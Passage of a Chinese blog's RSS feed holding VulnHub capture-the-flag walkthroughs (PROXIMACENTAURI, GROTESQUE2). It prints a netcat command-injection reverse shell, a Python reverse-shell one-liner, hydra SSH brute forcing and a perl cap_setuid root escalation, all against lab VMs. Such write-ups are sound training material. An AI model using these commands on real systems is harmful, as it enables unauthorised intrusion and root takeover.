&lt;h3 id=&#34;py脚本提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py脚本提权&#34;&gt;#&lt;/a&gt; py 脚本提权&lt;/h3&gt;
&lt;p&gt;查看是否有除 root 账户以外的有 bash 的用户 &lt;code&gt;cat /etc/passwd | grep bash&lt;/code&gt; &lt;br&gt;
 查看是否有相关的敏感文件泄漏，找到了一个备份的密码文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-778.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且 Asterisk 的中文为星号&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-779.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过遗留的密码切换到更高一级的用户 athena 上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-780.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看相应的权限设置是否正确，发现可以直接调用 root 账户执行这个 py 脚本&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-781.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接利用 root 权限执行此脚本&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-782.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并没有什么新发现，阅读此文件，发现可以通过拼接命令执行系统命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-783.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;构造命令 &lt;code&gt;id;nc 192.168.31.58 4445 -e /bin/bash;&lt;/code&gt;  执行，将 shell 反弹到 kali 机器上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-784.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Kali 上用来监听此端口，成功拿到了反弹的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-785.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/</guid>
            <title>VULNHUB 31 PROXIMACENTAURI</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/</link>
            <category>VULNHUB 31-40</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tcHJveGltYWNlbnRhdXJpLDcwOS8=&#34;&gt;https://www.vulnhub.com/entry/hacksudo-proximacentauri,709/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDM0NzYyL2FydGljbGUvZGV0YWlscy8xMTg2NjM1NTE=&#34;&gt;https://blog.csdn.net/qq_45434762/article/details/118663551&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 PROXIMACENTAURI：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-786.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.5&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.5&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-787.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNQ==&#34;&gt;http://192.168.31.5&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-788.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目录扫描:  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.5&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-789.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到很多目录，暂时不知道哪个目录比较敏感，需要依次访问&lt;/p&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzLw==&#34;&gt;http://192.168.31.5/docs/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-790.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到一个 php 后缀的文件，点开看看:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzL3VwZGF0YS5waHA=&#34;&gt;http://192.168.31.5/docs/updata.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-791.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-792.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9pbWFnZXMv&#34;&gt;http://192.168.31.5/images/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-793.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9sb2dpbi5waHA=&#34;&gt;http://192.168.31.5/login.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-794.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到一个后台的登陆地址，并且该 web 是有 pluck 4.7.13 写出来的&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy8=&#34;&gt;http://192.168.31.5/files/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-795.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9hZG1pbi5waHA=&#34;&gt;http://192.168.31.5/admin.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-796.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;管理员的后台地址，会自动跳转到 login 界面&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9yb2JvdHMudHh0&#34;&gt;http://192.168.31.5/robots.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-797.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9wbGFuZXQv&#34;&gt;http://192.168.31.5/planet/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-798.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQv&#34;&gt;http://192.168.31.5/files/planet/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-799.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQuaHRtbA==&#34;&gt;http://192.168.31.5/files/planet.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-800.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9yZXF1aXJlbWVudHMucGhw&#34;&gt;http://192.168.31.5/requirements.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-801.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找不到更多的线索了，根据已有的进行总结，发现只有一个 pluck 4.7.13 的信息，和一个后台的登陆地址可以利用&lt;/p&gt;
&lt;h3 id=&#34;pluck-漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pluck-漏洞利用&#34;&gt;#&lt;/a&gt; pluck 漏洞利用&lt;/h3&gt;
&lt;p&gt;用 searchsploit 搜索寻 pluck 对应版本漏洞，发现存在一个授权才能访问的 RCE 漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-802.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;确认 payload 的位置，将其复制到自己的目录下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-803.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-804.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;阅读此 py 文件，根据脚本中的内容，带参数执行脚本&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-805.png&#34; width=&#34;220&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;由于此漏洞只适应于 pluck 的授权 RCE，此处如果不能破解出来其账户和密码，显然无法使用，经尝试并不是弱口令，放弃这个目标，继续信息搜集&lt;/p&gt;
&lt;h3 id=&#34;dirb-扩大信息面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dirb-扩大信息面&#34;&gt;#&lt;/a&gt; dirb 扩大信息面&lt;/h3&gt;
&lt;p&gt;dirb 的优点在于搜集到一级目录后，还会继续尝试二级目录的识别&lt;/p&gt;
&lt;p&gt;用 dirb 收集更多的字目录信息: &lt;code&gt;dirb 192.168.31.5&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-806.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;依次去打开这些二级目录，发现了一个敏感的地址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoLw==&#34;&gt;http://192.168.31.5/data/trash/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-807.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;继续向下深入，看三级目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoL2ZpbGVzL3NoZWxsLnBoYXI=&#34;&gt;http://192.168.31.5/data/trash/files/shell.phar&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;最终在此路径下找到了一个 shell.phar 的文件，此命名就比较敏感&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-808.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 访问此目录，是一个 webshell，现在拿到了网站权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-809.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在网站上执行命令有诸多不便，需要将其反弹到终端上&lt;/p&gt;
&lt;p&gt;检测到服务器没有 nc，有一个 python3 ，就用 python3 来反弹 shell&lt;br&gt;
 &lt;code&gt;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.31.75 &amp;quot;,444 4 ));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-810.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;设置 stty 的格式，输出为一个比较美观的终端&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-811.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;端口敲门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口敲门&#34;&gt;#&lt;/a&gt; 端口敲门&lt;/h3&gt;
&lt;p&gt;敲门（knock）指的是我们从自己的客户端设备（pc、笔记本或者手机）向服务器 IP 发送一系列实现约好的暗号，而服务器上需要相应的安装接收暗号的服务 knockd，它在接收到正确的暗号的时候，会临时性的为敲门者开一段时间的门并随后关上（当然也能够配置成一直开着），我们要在这几秒钟里面登录成功并且保持连接，如果不小心断了连接就要重新敲门。&lt;/p&gt;
&lt;p&gt;拿到服务器的权限之后，去看了一些敏感文件，敏感权限之后都没有任何问题，筛选端口的时候发现 knock 命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-812.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看 knock 的配置文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-813.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一个 root 账户的端口敲门的配置问题，依次去敲击 14,29,43 端口可以将防火墙规则调整为开放，依次去敲击 62,40,46 端口可以将防火墙规则调整为关闭，注意有一个两个端口之间的间隔时间不能大于 15 ms&lt;/p&gt;
&lt;p&gt;依次按顺序敲击这三个端口 &lt;code&gt;sudo nmap -p 14,29,43 192.168.31.5&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-814.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;敲击端口前，是 22 是被过滤的，端口敲门之后并没有立即将端口轰开，反而是等待了一段时间之后才将 22 端口打开，现在 22 已经打开，可以通过 ssh 去连接这台服务器了，但是我们并没有 root 账户的密码，怎么去连接呢。&lt;/p&gt;
&lt;p&gt;先直接去做，看能不能有什么收获 &lt;code&gt;ssh root@192.168.31.5&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-815.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
&lt;p&gt;看到了一个 github 地址，点开进入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-816.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现是一系列密码并且提示用 proxima、centauri 进行爆破，将字典加载到本地，准备用 hydra 爆破一波&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-817.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看到服务器上存在的用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-818.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;服务器存在 proxima、centauri 用户，将这两个名字写到 user.txt 中，用 hydra 进行爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-819.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;hydra -L user.txt -P passwd.txt ssh://192.168.31.5 -t 4 -I -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-820.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很遗憾，爆破失败，继续往下做，在实际测试中，经常有爆破失败的情况，我们需要从更多的角度去收集服务器的信息，经过检查，发现服务器上存在 mysql 的备份文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-821.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 备份文件中就有用户名和密码，alfauser:passw0rd&lt;/p&gt;
&lt;h3 id=&#34;数据库信息泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据库信息泄露&#34;&gt;#&lt;/a&gt; 数据库信息泄露&lt;/h3&gt;
&lt;p&gt;登陆数据库，查询敏感账户和密码： &lt;code&gt;mysql -u alfauser -p&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-822.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;连接成功，搜索敏感文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-823.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一翻搜索后，在数据库中找到了 proxima 账户和其密码，切换账户至 proxima 账户，成功拿到其 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-824.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;cap_setuid-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cap_setuid-提权&#34;&gt;#&lt;/a&gt; cap_setuid 提权&lt;/h3&gt;
&lt;p&gt;接下来要想办法提权至 root，直接上监控 linpeas 看有什么可疑的文件&lt;br&gt;
 &lt;code&gt;wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-825.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;运行 linpeas 进行检测&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-826.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;使用 linpeas 之后监测到一个权限设置错误的命令 perl&lt;/p&gt;
&lt;p&gt;Capabilities 是 linux 的一种访问控制能力，能够更精细化的将操作系统权限（网络，文件等）赋权给应用程序，其中就包括设置 uid 和 gid 的权限。因此具备 cap_setuid 和 cap_setgid 权限的程序可以用来进行权限提升。&lt;/p&gt;
&lt;p&gt;提权利用命令在 gtfobins 上可以找到更多：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGVybC8=&#34;&gt;https://gtfobins.github.io/gtfobins/perl/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-827.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看官方介绍，也就是为了细分 root 权限的 capabilities，但是也会因为设置错误导致权限提升&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &amp;quot;/bin/sh&amp;quot;;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-828.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/134%20GROTESQUE2/</guid>
            <title>VULNHUB 34 GROTESQUE2</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/134%20GROTESQUE2/</link>
            <category>VULNHUB 31-40</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTIsNjczLw==&#34;&gt;https://www.vulnhub.com/entry/grotesque-2,673/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGVuZXItc3FwL3AvMTQ4Mjc3NzMuaHRtbA==&#34;&gt;https://www.cnblogs.com/pener-sqp/p/14827773.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 GROTESQUE2：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; ; rm -f 1.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-893.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.73&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.73&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-894.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 2 2…600 基本上都开放&lt;/p&gt;
&lt;p&gt;这么多网站都开放的肯定是有问题的，需要打开几个找问题所在&lt;/p&gt;
&lt;h3 id=&#34;wget-批量下载网站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wget-批量下载网站&#34;&gt;#&lt;/a&gt; wget 批量下载网站&lt;/h3&gt;
&lt;p&gt;002 信息收集，wget 批量下载，awk/sort 排序分析&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNzM=&#34;&gt;http://192.168.31.73&lt;/span&gt; , &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNzM6OTk=&#34;&gt;http://192.168.31.73:99&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-895.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-896.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对比下面两个网站发现一模一样没有任何区别&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;猜测从 22 到 600 这么多页面基本上都是一模一样的，唯有一个不同，而那个不同的页面需要通过脚本或者其他的方式筛选出来，可以用 burp 的方式访问不同端口的网站，看返回的数据包的长度来找，也可以用 wget 批量下载页面，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下载所有文件 &lt;code&gt;for i in &amp;#123;23..600&amp;#125;;do wget 192.168.31.73:$i -O index$i;done&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-897.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-898.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;linux-排序文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-排序文件&#34;&gt;#&lt;/a&gt; linux 排序文件&lt;/h3&gt;
&lt;p&gt;对下载到的文件进行排序  &lt;code&gt;ls -Al | sort | awk &#39;&amp;#123;print $5,$9&amp;#125;&#39; | tail -n10&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-899.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 看到在 258 端口处的网站有不一样的返回结果&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNzM6MjU4Lw==&#34;&gt;http://192.168.31.73:258/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-900.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;给出提示，ssh 的用户名可能是如下这几个&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-901.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;智力游戏解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智力游戏解密&#34;&gt;#&lt;/a&gt; 智力游戏解密&lt;/h3&gt;
&lt;p&gt;审查源代码发现了一个图片的地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-902.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNzM6MjU4L2Vtb2ppL2hhbmQucG5n&#34;&gt;http://192.168.31.73:258/emoji/hand.png&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-903.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;大致一看是没有什么特殊的，但是仔细看图片后，发现隐藏着一些敏感信息，在图片的中间有一串 hash 数据： &lt;code&gt;b6e705ea1249e2bb7b0fd7dac9fcd1b3&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-904.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;解密此 md5 加密，得到密码为 solomon1&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-905.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;到此已经收集到了几个可能的用户名和一个 ssh 密码&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;hydra -L user.txt -p solomon1 ssh://192.168.31.22 -t 4&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-906.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到一组 ssh 的登陆凭据 angel:solomon1  &lt;code&gt;ssh angel@192.168.31.73&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-907.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;pspy-监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pspy-监控&#34;&gt;#&lt;/a&gt; pspy 监控&lt;/h3&gt;
&lt;p&gt;上传 pspy 监控看有没有被定时执行的任务&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-908.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;两个脚本定时执行，由于权限不足不能查看这两个脚本的作用，只能进行猜测，搜索目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-909.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
